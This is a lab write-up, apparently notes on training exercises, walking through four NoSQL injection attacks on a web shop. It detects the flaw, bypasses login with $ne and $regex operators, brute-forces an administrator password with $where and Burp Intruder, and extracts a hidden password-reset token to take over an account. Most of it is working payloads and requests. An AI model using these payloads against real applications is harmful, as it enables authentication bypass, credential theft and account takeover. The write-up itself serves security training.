# Navigation
- [Detecting NoSQL injection](#detecting-nosql-injection)
- [Exploiting NoSQL operator injection to bypass authentication](#exploiting-nosql-operator-injection-to-bypass-authentication)
- [Exploiting NoSQL injection to extract data](#exploiting-nosql-injection-to-extract-data)
- [Exploiting NoSQL operator injection to extract unknown fields](#exploiting-nosql-operator-injection-to-extract-unknown-fields)
# Detecting NoSQL injection
- Display unreleased products
1. Load page
2. Select a category of items reveals a GET request with a URL parameter `category`
```
GET /filter?category=Gifts
```
3. Submit probe NoSQL syntax injection payload
```
GET /filter?category=%27%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
- The payload below is the non URL-encoded version
```
'"`{
;$Foo}
$Foo \xYZ
```
4. Receive `500` error and see detailed error message
```
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
```
5. Test if you can control conditional statements using TRUE and FALSE payloads
	1. **Note:** You need to maintain a legit value for the `category` parameter e.g. `Gifts` to differentiate between the TRUE and FALSE payloads
```
Gifts'+%26%26+0+%26%26+'x      # false
Gifts'+%26%26+1+%26%26+'x      # true
```
- The true payload returns a larger HTTP response indicating conditional statements can be controlled
6. Submit a payload that always evaluates to TRUE
```
GET /filter?category=Gifts'||'1'=='1
```
# Exploiting NoSQL operator injection to bypass authentication
- Log into the application as the `administrator`
1. Login with `wiener:peter` and see POST request to login uses JSON body
```json
{"username":"wiener","password":"peter"}
```
2. Test operator injection in the username field to see if we can still authenticate with the correct password and injected username
```json
{"username":{"$ne":"invalid_username"},"password":"peter"}
```
- 302 redirect to Wiener's account indicates successful injection
3. Test same injection this time only on the password field
```json
{"username":"wiener","password":{"$ne":"invalid_password"}}
```
- 302 redirect to Wiener's account indicates successful injection
4. Trying to inject both fields simultaneously with `$ne` operators triggers a 500 error
```json
{"username":{"$ne":"wiener"},"password":{"$ne":"invalid_password"}}
```
5. Trying to guess the Administrator's username as well does not work, (we get invalid username/password response)
6. Utilise MongoDB's `$regex` operators to match the Administrator's username
```json
{"username":{"$regex":"admin*"},"password":{"$ne":"invalid_password"}}
```
7. Copy session cookie and authenticate to the page
# Exploiting NoSQL injection to extract data
- Login with your own account `wiener:peter`
- Extract password and login as `adminstrator`
1. Login with credentials
2. View account page > change email > identify request in HTTP history showing user account lookup
```
GET /user/lookup?user=wiener
```
- This request returns JSON data
3. Fuzz for different behaviour
```
GET /user/lookup?user=wiener  # returns data
GET /user/lookup?user=wiener' # returns error
GET /user/lookup?user=wiener1 # returns "could not find user"
```
4. There is also an IDOR if we change the username parameter to equal `administrator`
```
GET /user/lookup?user=administrator
```
5. We can determine the length of a target's password using the following query
```
GET /user/lookup?user=wiener<@urlencode>' && this.password.length == '5</@urlencode>
```
- We are submitting a query that is asking if the length of the password is equal to `5`
- We receive wiener's details confirming the password is `5` characters long which we know is true. Changing the `5` to `6` returns "could not find user"
6. Check the length of the administrator's password by using Intruder
```
GET /user/lookup?user=administrator<@urlencode>' && this.password.length == '§§</@urlencode>
```
- Configure Grep - Extract for the message "Could not find user" - The response that does not include this response indicates the length
7. We get user details for payload `8` indicating the password is `8` characters long
8. Construct Intruder attack to extract all `8` characters from the password
```
GET /user/lookup?user=administrator<@urlencode>' && this.password[§0§] == '§a§' || 'a' == 'b</@urlencode>
```
9. Configure the following:
	1. Attack type: Cluster bomb attack
	2. Payload position 1 (`0`):
		1. Payload type: Numbers
		2. Number 0 - 7 (equals 8 in total)
	3. Payload position 2 (`a`):
		1. Payload type: Simple list
		2. a-z payloads
	4. Grep - Extract
		1. "Could not find user"
10. Start attack
	1. Collect the results so that the results are showing the Payload 1 in order and the responses do not include "Could not find user"
	2. Copy + Paste results into Excel
	3. Use a formula to extract and concatenate all the data into a single cell
```
=TEXTJOIN("",TRUE,FILTER(C:C,C:C<>""))
```
11. Authenticate to the application as Administrator
# Exploiting NoSQL operator injection to extract unknown fields
- Login as `carlos`
1. Login page
2. Forgot password > Enter `carlos` username
3. Capture login request for `carlos` > Observe request is made in JSON
```json
{"username":"carlos","password":"password"}
```
- We receive "Invalid password" response and 3,587 bytes in the response
4. Inject a `$ne` operator to test authentication bypass
```JSON
{"username":"carlos","password":{"$ne":"password"}}
```
- We receive "Account locked" response and 3,601 bytes in the response
5. Test boolean conditions to determine between TRUE and FALSE behaviour
```JSON
{"username":"carlos","password":{"$ne":"password"},"$where":"1"} // TRUE
{"username":"carlos","password":{"$ne":"password"},"$where":"0"} // FALSE
```
- TRUE condition returns "Account locked" response
- FALSE condition returns "Invalid password" response
5. Inject an operator to see if we can extract the length of specific field names
```JSON
{"username":"carlos","password":{"$regex":"^.*"},"$where":"Object.keys(this)[0].match('^.{3}$')"}
```
- Fuzz the `{3}` with numbers payload in Intruder
- Change the `[0]` selector to change the field we are querying
- We receive a TRUE response for the first field being `3` characters
6. Checking different fields, we discover the following
	1. `[1]` = `username`
	2. `[2]` = `password`
	3. `[3]` = `email`
7. Now we brute-force the `[4]` field
	1. First get the length of the field
```JSON
{"username":"carlos","password":{"$regex":"^.*"},"$where":"Object.keys(this)[4].match('^.{13}$')"}
```
- TRUE response for 13 indicating the field name is 13 characters long
8. Use the [fieldName_exfiltration.py](resources/fieldName_exfiltration.py) script to extract the field name
	1. Change the `url` variable to match your lab
	2. Change the `if len(a) == 13` to match the length of the field that you extracted in your lab
9. We have extracted the field name to be `resetPwdToken`
10. Use this new field along with `$regex` to extract the length of the value
```JSON
{"username":"carlos","password":{"$ne":"1"},"resetPwdToken":{"$regex":"^.{FUZZ}$"} }
```
- Configuration:
	- Numbers payload
	- 0 - 50
	- Run attack and look for the TRUE response (larger byte size or "Account locked" message in HTTP response)
11. Use the [fieldNameValue_exfiltration.py](resources/fieldNameValue_exfiltration.py) script to extract the value of the `resetPwdToken`
	1. Change the `url` variable to match your lab
	2. Change the `if len(a) == 16` to match the length of the field that you extracted in your lab
12. With this extracted token navigate to the `/forgot/password` endpoint
```
GET /forgot-password?resetPwdToken=029f45c76794a059
```
13. Reset password > Authenticate as Carlos